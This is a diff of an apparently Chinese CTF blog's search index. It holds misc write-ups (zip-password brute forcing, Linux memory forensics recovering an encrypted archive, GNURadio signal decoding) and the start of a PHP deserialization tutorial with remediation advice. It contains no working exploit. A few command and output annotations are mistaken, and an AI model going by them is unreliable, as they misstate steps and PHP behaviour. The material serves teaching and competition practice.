-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/Clip_2024-07-23_16-00-23.png"
-                        alt="Clip_2024-07-23_16-00-23"
-                 ></p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/Clip_2024-07-23_16-00-36.png"
-                        alt="Clip_2024-07-23_16-00-36"
-                 ></p>
-<p>修改后可以正常进行解压得到<code>320.zip</code>，查看压缩文件注释可以得到密码的提示<code>just a byte</code>，密码为一个字节，可以使用python进行爆破。</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pyzipper</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">320</span>,<span class="number">0</span>,-<span class="number">1</span>):</span><br><span class="line">    zip_filename = <span class="built_in">str</span>(i) + <span class="string">&quot;.zip&quot;</span></span><br><span class="line">    zf = pyzipper.AESZipFile(zip_filename, <span class="string">&#x27;r&#x27;</span>, compression=pyzipper.ZIP_LZMA, encryption=pyzipper.WZ_AES)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">0xff</span>+<span class="number">1</span>):</span><br><span class="line">        password = j.to_bytes(length=<span class="number">1</span>, byteorder=<span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">        zf.setpassword(password)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            zf.extractall()</span><br><span class="line">            zf.close()</span><br><span class="line">            os.remove(<span class="built_in">str</span>(i) + <span class="string">&quot;.zip&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
-<p>解压得到一个txt，提示加密方法为AES-ECB，并提示key可能在前面的过程中就出现了</p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/Clip_2024-07-23_16-03-17.png"
-                        alt="Clip_2024-07-23_16-03-17"
-                 ></p>
-<p>联想到前面解压密码是字节形式，通过打印解压密码发现</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pyzipper</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">key = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">320</span>,<span class="number">0</span>,-<span class="number">1</span>):</span><br><span class="line">    zip_filename = <span class="built_in">str</span>(i) + <span class="string">&quot;.zip&quot;</span></span><br><span class="line">    zf = pyzipper.AESZipFile(zip_filename, <span class="string">&#x27;r&#x27;</span>, compression=pyzipper.ZIP_LZMA, encryption=pyzipper.WZ_AES)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">0xff</span>+<span class="number">1</span>):</span><br><span class="line">        password = j.to_bytes(length=<span class="number">1</span>, byteorder=<span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">        zf.setpassword(password)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            zf.extractall()</span><br><span class="line">            key += password</span><br><span class="line">            zf.close()</span><br><span class="line">            os.remove(<span class="built_in">str</span>(i) + <span class="string">&quot;.zip&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"><span class="built_in">print</span>(key[::-<span class="number">1</span>].<span class="built_in">hex</span>())</span><br></pre></td></tr></table></figure>
-<p><code>c64e5e2225444a9da66b0f28ad718f798cffa70a48124ec5873a610c5899bb11c64e5e2225444a9da66b0f28ad718f798cffa70a48124ec5873a610c5899bb11c64e5e2225444a9da66b0f28ad718f798cffa70a48124ec5873a610c5899bb11c64e5e2225444a9da66b0f28ad718f798cffa70a48124ec5873a610c5899bb11c64e5e2225444a9da66b0f28ad718f798cffa70a48124ec5873a610c5899bb11c64e5e2225444a9da66b0f28ad718f798cffa70a48124ec5873a610c5899bb11c64e5e2225444a9da66b0f28ad718f798cffa70a48124ec5873a610c5899bb11c64e5e2225444a9da66b0f28ad718f798cffa70a48124ec5873a610c5899bb11c64e5e2225444a9da66b0f28ad718f798cffa70a48124ec5873a610c5899bb11c64e5e2225444a9da66b0f28ad718f798cffa70a48124ec5873a610c5899bb11</code></p>
-<p>是循环的一个64位字符，将其当作key解密AES得到flag</p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/Clip_2024-07-23_16-04-42.png"
-                        alt="Clip_2024-07-23_16-04-42"
-                 ></p>
-<h3 id="ServerMeM">ServerMeM</h3>
-<p>题面信息如下</p>
-<blockquote>
-<p>公司的服务器遭受了黑客的攻击，经过勘察黑客为维持权限留下了后门，我们获取到了服务器的内存文件，请你分析黑客留下的痕迹</p>
-</blockquote>
-<p>下载附件并解压得到：out.lime、System.map</p>
-<p>在WSL中用以下命令搜索一下得到Linux内核的版本号，因此很明显就是Linux内存取证了</p>
-<blockquote>
-<p>strings mem | grep -i ‘Linux version’ | uniq</p>
-</blockquote>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240923181948954.png"
-                        alt="image-20240923181948954"
-                 ></p>
-<p>本题提供两种解法，第一种是常规的通过制作Linux的符号文件来进行取证，另一种就是直接分析内存中的可疑文件</p>
-<h4 id="解法一">解法一</h4>
-<p>Linux内核版本信息如下：</p>
-<blockquote>
-<p>Linux version 5.4.27 (root@localhost.localdomain) (gcc version 4.8.5 20150623 (Red Hat 4.8.5-44) (GCC)) #1 SMP Sun May 26 03:37:06 EDT 2024</p>
-</blockquote>
-<h4 id="解法二">解法二</h4>
-<p>直接在strings的结果中搜索 ”.tar.gz” 后缀的文件，发现有一个S3rCr3t.tar.gz</p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240923182121568.png"
-                        alt="image-20240923182121568"
-                 ></p>
-<p>知道了文件名后直接在010中搜索，得到了openssl AES加密后的密文（以Salted开头）</p>
-<p>还有openssl的具体版本：1.0.2k</p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240923182211807.png"
-                        alt="image-20240923182211807"
-                 ></p>
-<p>用CyberChef提取，注意后面的注释不要一起提取出来</p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/11111111.png"
-                        alt="11111111"
-                 ></p>
-<p>继续往下查看，可以找到 openssl 加密的密钥：P@ssW0rdddd</p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240923182320920.png"
-                        alt="image-20240923182320920"
-                 ></p>
-<p>然后只要安装openssl-1.0.2-k，使用得到的密钥解密即可</p>
-<p>具体安装步骤如下，编译完成后openssl可执行文件在apps目录下</p>
-<blockquote>
-<p>wget <a class="link"   href="https://www.openssl.org/source/old/1.0.2/openssl-1.0.2k.tar.gz" >https://www.openssl.org/source/old/1.0.2/openssl-1.0.2k.tar.gz<i class="fas fa-external-link-alt"></i></a></p>
-<p>tar -xzvf openssl-1.0.2k.tar.gz</p>
-<p>cd openssl-1.0.2k.tar.gz</p>
-<p>./config --prefix=/usr/</p>
-<p>make</p>
-</blockquote>
-<p>使用以下命令解密即可得到flag：DASCTF{c086cd55-b86a-4ee6-8933-c8bee578148a}</p>
-<blockquote>
-<p>./openssl-1.0.2k/apps/openssl enc -d -aes256 -in download.bin -out flag.tar.gz -k P@ssW0rdddd</p>
-</blockquote>
-<h3 id="ez-wav">ez_wav</h3>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/das240711.png"
-                        alt="das240711"
-                 ></p>
-<p>打开key.grc</p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/das240712.png"
-                        alt="das240712"
-                 ></p>
-<p>可知key文件经过如上流程变成look.txt文件。我们需要根据这个流程逆回key文件</p>
-<blockquote>
-<p>信号源——》xor-&gt;数据类型转换-&gt;相乘一个常数-&gt;写入</p>
-<p>下面的Vector Source提供的一个脉冲信号</p>
-</blockquote>
-<p>exp如下</p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/04e83e72-8324-40b3-8d14-0cf50565178e.png"
-                        alt="04e83e72-8324-40b3-8d14-0cf50565178e"
-                 ></p>
-<p>010打开后得到密码 good_job</p>
-<p>打开flag.grc</p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/2fba9b78-9356-4852-aa1a-8aadee4dee85.png"
-                        alt="2fba9b78-9356-4852-aa1a-8aadee4dee85"
-                 ></p>
-<p>如果我们想要抵消载波的影响，那么就需要给他相乘一个相反的波形，下面是AM解调过程</p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/8209f61b-1618-48de-8084-75189f5b1fa8.png"
-                        alt="8209f61b-1618-48de-8084-75189f5b1fa8"
-                 ></p>
-<p>如果我们想要抵消载波的影响，那么就需要给他相乘一个相反的波形，下面是AM解调过程</p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/4bda376f-8a5f-450b-88b4-357a057b85e2.png"
-                        alt="4bda376f-8a5f-450b-88b4-357a057b85e2"
-                 ></p>
-<p>如果我们想要抵消载波的影响，那么就需要给他相乘一个相反的波形，下面是AM解调过程</p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/893acd65-17e9-48ab-9221-b84a454b27c0.png"
-                        alt="893acd65-17e9-48ab-9221-b84a454b27c0"
-                 ></p>
-<p>听flag即可</p>
-]]></content>
-      <categories>
-        <category>CTF</category>
-      </categories>
-      <tags>
-        <tag>Misc</tag>
       </tags>
   </entry>
   <entry>
@@ -1556,6 +1556,85 @@
       </categories>
       <tags>
         <tag>Reverse</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>PHP反序列化</title>
+    <url>//post/PHPunserialize/</url>
+    <content><![CDATA[<h3 id="PHP反序列化的概念">PHP反序列化的概念</h3>
+<p>PHP反序列化漏洞是一种安全漏洞，存在于使用PHP编程语言的应用程序中。它涉及到将未经充分验证的用户提供的数据作为序列化字符串传递给<code>unserialize()</code>函数或类似的反序列化函数，从而导致潜在的安全风险。</p>
+<p><strong>序列化是将数据结构或对象转换为字符串的过程</strong>，以便在网络上传输或存储到数据库等地方。<strong>反序列化则是将序列化的字符串转换回原始数据结构或对象</strong>。</p>
+<p>当应用程序使用反序列化函数处理来自用户的输入时，如果没有进行足够的验证和过滤，恶意用户可以构造恶意的序列化字符串，以执行未授权的操作，如执行任意代码、修改对象属性、实现拒绝服务攻击等。</p>
+<p>这种漏洞通常出现在应用程序中处理用户提供的会话数据、cookie、缓存、消息队列等地方。攻击者可以通过利用这些漏洞来实现对应用程序的攻击和控制。</p>
+<h3 id="PHP反序列化漏洞的修复建议">PHP反序列化漏洞的修复建议</h3>
+<ol>
+<li><strong>更新PHP版本</strong>：确保使用的PHP版本是最新的稳定版本，因为新版本通常会修复已知的安全漏洞。</li>
+<li><strong>谨慎处理用户输入</strong>：对于从用户获取的数据，始终进行充分的验证和过滤。不要将未经验证的数据传递给反序列化函数。</li>
+<li><strong>使用安全的反序列化方法</strong>：如果必须执行反序列化操作，尽量使用安全的反序列化方法，例如JSON序列化而非PHP序列化。</li>
+<li><strong>限制反序列化操作的范围</strong>：在可能的情况下，限制反序列化操作的范围，仅允许序列化和反序列化受信任的数据结构。</li>
+<li><strong>实施输入验证</strong>：在接受用户输入之前，进行输入验证，确保数据符合预期格式和范围。</li>
+<li><strong>使用白名单</strong>：对于反序列化操作，使用白名单机制来验证数据结构，只允许特定的类被反序列化。</li>
+<li><strong>监控和日志记录</strong>：实施监控和日志记录机制，以便及时检测到可能的攻击，并记录恶意行为以进行后续分析。</li>
+</ol>
+<h3 id="PHP面向对象编程">PHP面向对象编程</h3>
+<h4 id="创建一个PHP类：">创建一个PHP类：</h4>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestClass</span> //定义一个类</span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="comment">//一个变量</span></span><br><span class="line"><span class="keyword">public</span> <span class="variable">$variable</span> = <span class="string">&#x27;This is a string&#x27;</span>;</span><br><span class="line"><span class="comment">//一个方法</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">PrintVariable</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;variable;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//创建一个对象</span></span><br><span class="line"><span class="variable">$object</span> = <span class="keyword">new</span> <span class="title class_">TestClass</span>();</span><br><span class="line"><span class="comment">//调用一个方法</span></span><br><span class="line"><span class="variable">$object</span>-&gt;<span class="title function_ invoke__">PrintVariable</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<h4 id="PHP的访问控制">PHP的访问控制</h4>
+<p>在PHP中，<code>public</code>、<code>protected</code>和<code>private</code>是用于定义类成员（属性和方法）可见性的访问修饰符。</p>
+<ol>
+<li><strong>public（公共）</strong>：公共成员可以在任何地方被访问，包括类的外部。这意味着公共属性和方法可以通过类的实例或类本身直接访问。</li>
+</ol>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyClass</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$publicVar</span> = <span class="string">&#x27;public&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">publicMethod</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Public Method&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> <span class="title class_">MyClass</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$obj</span>-&gt;publicVar; <span class="comment">// Output: public</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$obj</span>-&gt;<span class="title function_ invoke__">publicMethod</span>(); <span class="comment">// Output: Public Method</span></span><br></pre></td></tr></table></figure>
+<ol start="2">
+<li><strong>protected（受保护的）</strong>：受保护的成员只能在其定义的类和其子类中访问。外部类无法直接访问受保护的成员。</li>
+</ol>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyClass</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$protectedVar</span> = <span class="string">&#x27;protected&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">protectedMethod</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Protected Method&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SubClass</span> <span class="keyword">extends</span> <span class="title">MyClass</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">accessProtected</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;protectedVar; <span class="comment">// 这里可以访问父类的受保护属性</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> <span class="title class_">SubClass</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$obj</span>-&gt;<span class="title function_ invoke__">accessProtected</span>(); <span class="comment">// Output: protected</span></span><br></pre></td></tr></table></figure>
+<ol start="3">
+<li><strong>private（私有的）</strong>：私有成员只能在其定义的类内部访问，外部类和子类都无法直接访问私有成员。</li>
+</ol>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyClass</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$privateVar</span> = <span class="string">&#x27;private&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">privateMethod</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Private Method&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> <span class="title class_">MyClass</span>();</span><br><span class="line"><span class="comment">// echo $obj-&gt;privateVar; // 无法直接访问私有属性，会导致错误</span></span><br><span class="line"><span class="comment">// echo $obj-&gt;privateMethod(); // 无法直接访问私有方法，会导致错误</span></span><br></pre></td></tr></table></figure>
+<p>这些访问修饰符允许类作者控制类成员的可见性和访问权限，从而提高代码的安全性和封装性。</p>
+<p>注：</p>
+<p>public：属性被序列化的时候属性值会变成<code>属性名</code></p>
+<p>protected：属性被序列化的时候属性值会变成 <code>\x00*\x00属性名</code></p>
+<p>private：属性被序列化的时候属性值会变成<code>\x00类名\x00属性名</code></p>
+<p>其中：<code>\x00</code>表示<strong>空字符</strong>，但是还是占用一个字符位置（空格）</p>
+<h3 id="PHP魔术方法">PHP魔术方法</h3>
+<ol>
+<li><code>__construct()</code>：类的构造函数，在创建对象时触发。用于初始化对象的状态。</li>
+<li><code>__destruct()</code>：类的析构函数，在对象被销毁时触发。用于执行清理操作。</li>
+<li><code>__call($name, $arguments)</code>：在对象上下文中调用不可访问的方法时触发。</li>
+<li><code>__callStatic($name, $arguments)</code>：在静态上下文中调用不可访问的方法时触发。</li>
+<li><code>__get($name)</code>：读取不可访问属性的值时触发。这里的不可访问包括私有属性或未定义属性。</li>
+<li><code>__set($name, $value)</code>：在给不可访问属性赋值时触发。</li>
+<li><code>__isset($name)</code>：当对不可访问属性调用 isset() 或 empty() 时触发。</li>
+<li><code>__unset($name)</code>：在不可访问的属性上使用unset()时触发。</li>
+<li><code>__invoke()</code>：当尝试以调用函数的方式调用一个对象时触发。即使对象不是一个函数。</li>
+<li><code>__sleep()</code>：执行serialize()时，先会调用这个方法。通常用于执行对象序列化之前的准备工作。</li>
+<li><code>__wakeup()</code>：执行unserialize()时，先会调用这个方法。通常用于执行对象反序列化之后的处理。</li>
+<li><code>__toString()</code>：当反序列化后的对象被输出在模板中时（转换成字符串时）自动调用。通常用于自定义对象的字符串表示形式。</li>
+</ol>
+<h4 id="魔术方法的执行过程">魔术方法的执行过程</h4>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>=<span class="string">&quot;hi&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>=<span class="string">&quot;no&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a=<span class="string">&quot;hiiiii!&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;a.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;this is construct\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;this is wakeup\n&quot;</span>;</span><br><span class="line">    &#125;<span class="comment">//反序列化之前</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;this is destruct\n&quot;</span>;</span><br><span class="line">    &#125;<span class="comment">//反序列化时会最后才触发</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;this is tostring\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arguments</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;this is call\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$a</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;this is get\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;this is invoke\n&quot;</span>;</span><br><span class="line">    &#125;<span class="comment">//尝试当作函数</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">say_hi</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;hiuhiu\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$aa</span>=<span class="keyword">new</span> <span class="title function_ invoke__">A</span>();<span class="comment">// 所有最后都还要析构一次，对象的消失</span></span><br><span class="line"><span class="variable">$aa</span>-&gt;<span class="title function_ invoke__">say_hi</span>();</span><br><span class="line"><span class="variable">$bb</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$aa</span>);</span><br><span class="line"><span class="variable">$cc</span>=<span class="title function_ invoke__">unserialize</span>(<span class="variable">$bb</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$aa</span>;<span class="comment">// 作为字符串用时触发 tostring</span></span><br><span class="line"><span class="variable">$aa</span>-&gt;<span class="title function_ invoke__">say_no</span>(); <span class="comment">//call</span></span><br><span class="line"><span class="variable">$aa</span>-&gt;c; <span class="comment">//get</span></span><br><span class="line"><span class="variable">$aa</span>(); <span class="comment">//invoke</span></span><br></pre></td></tr></table></figure>
+<p>执行结果：</p>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">hiiiii!</span><br><span class="line">this is construct  //$aa=new A();</span><br><span class="line">hiuhiu  //$aa-&gt;say_hi();</span><br><span class="line">this is wakeup  //$bb=serialize($aa);</span><br><span class="line">this is tostring  //echo $aa;</span><br><span class="line">this is call  //$aa-&gt;say_no();</span><br><span class="line">this is get//$aa-&gt;c</span><br><span class="line">this is invoke  //$aa();</span><br><span class="line">this is destruct  //$cc=unserialize($bb);</span><br><span class="line">this is destruct</span><br></pre></td></tr></table></figure>
+<p>从序列化到反序列化这几个函数的执行过程是：<br>
+<code>__construct()</code> -&gt;<code>__sleep</code> -&gt; <code>__wakeup()</code> -&gt; <code>__toString()</code> -&gt; <code>__destruct()</code></p>
+<h3 id="PHP序列化的格式">PHP序列化的格式</h3>
+<p><code>O:&lt;length&gt;:&quot;&lt;class name&gt;&quot;:&lt;n&gt;:&#123;&lt;field name 1&gt;&lt;field value 1&gt;...&lt;field name n&gt;&lt;field value n&gt;&#125; </code></p>
+<p><code>O</code>:表示序列化的是对象<br>
+<code>&lt;length&gt;</code>:表示序列化的类名称长度<br>
+<code>&lt;class name&gt;</code>：表示序列化的类的名称<br>
+<code>&lt;n&gt;</code>:表示被序列化的对象的属性个数<br>
+<code>&lt;field name 1&gt;</code>：属性名<br>
+<code>&lt;field value 1&gt;</code>：属性值</p>
+<h3 id="POP链构造">POP链构造</h3>
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>Web</tag>
       </tags>
   </entry>
   <entry>
@@ -2370,85 +2449,6 @@ U     R    H   D    B     D   F    G    E</p>
       </categories>
       <tags>
         <tag>Misc</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>PHP反序列化</title>
-    <url>//post/PHPunserialize/</url>
-    <content><![CDATA[<h3 id="PHP反序列化的概念">PHP反序列化的概念</h3>
-<p>PHP反序列化漏洞是一种安全漏洞，存在于使用PHP编程语言的应用程序中。它涉及到将未经充分验证的用户提供的数据作为序列化字符串传递给<code>unserialize()</code>函数或类似的反序列化函数，从而导致潜在的安全风险。</p>
-<p><strong>序列化是将数据结构或对象转换为字符串的过程</strong>，以便在网络上传输或存储到数据库等地方。<strong>反序列化则是将序列化的字符串转换回原始数据结构或对象</strong>。</p>
-<p>当应用程序使用反序列化函数处理来自用户的输入时，如果没有进行足够的验证和过滤，恶意用户可以构造恶意的序列化字符串，以执行未授权的操作，如执行任意代码、修改对象属性、实现拒绝服务攻击等。</p>
-<p>这种漏洞通常出现在应用程序中处理用户提供的会话数据、cookie、缓存、消息队列等地方。攻击者可以通过利用这些漏洞来实现对应用程序的攻击和控制。</p>
-<h3 id="PHP反序列化漏洞的修复建议">PHP反序列化漏洞的修复建议</h3>
-<ol>
-<li><strong>更新PHP版本</strong>：确保使用的PHP版本是最新的稳定版本，因为新版本通常会修复已知的安全漏洞。</li>
-<li><strong>谨慎处理用户输入</strong>：对于从用户获取的数据，始终进行充分的验证和过滤。不要将未经验证的数据传递给反序列化函数。</li>
-<li><strong>使用安全的反序列化方法</strong>：如果必须执行反序列化操作，尽量使用安全的反序列化方法，例如JSON序列化而非PHP序列化。</li>
-<li><strong>限制反序列化操作的范围</strong>：在可能的情况下，限制反序列化操作的范围，仅允许序列化和反序列化受信任的数据结构。</li>
-<li><strong>实施输入验证</strong>：在接受用户输入之前，进行输入验证，确保数据符合预期格式和范围。</li>
-<li><strong>使用白名单</strong>：对于反序列化操作，使用白名单机制来验证数据结构，只允许特定的类被反序列化。</li>
-<li><strong>监控和日志记录</strong>：实施监控和日志记录机制，以便及时检测到可能的攻击，并记录恶意行为以进行后续分析。</li>
-</ol>
-<h3 id="PHP面向对象编程">PHP面向对象编程</h3>
-<h4 id="创建一个PHP类：">创建一个PHP类：</h4>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestClass</span> //定义一个类</span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="comment">//一个变量</span></span><br><span class="line"><span class="keyword">public</span> <span class="variable">$variable</span> = <span class="string">&#x27;This is a string&#x27;</span>;</span><br><span class="line"><span class="comment">//一个方法</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">PrintVariable</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;variable;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//创建一个对象</span></span><br><span class="line"><span class="variable">$object</span> = <span class="keyword">new</span> <span class="title class_">TestClass</span>();</span><br><span class="line"><span class="comment">//调用一个方法</span></span><br><span class="line"><span class="variable">$object</span>-&gt;<span class="title function_ invoke__">PrintVariable</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<h4 id="PHP的访问控制">PHP的访问控制</h4>
-<p>在PHP中，<code>public</code>、<code>protected</code>和<code>private</code>是用于定义类成员（属性和方法）可见性的访问修饰符。</p>
-<ol>
-<li><strong>public（公共）</strong>：公共成员可以在任何地方被访问，包括类的外部。这意味着公共属性和方法可以通过类的实例或类本身直接访问。</li>
-</ol>
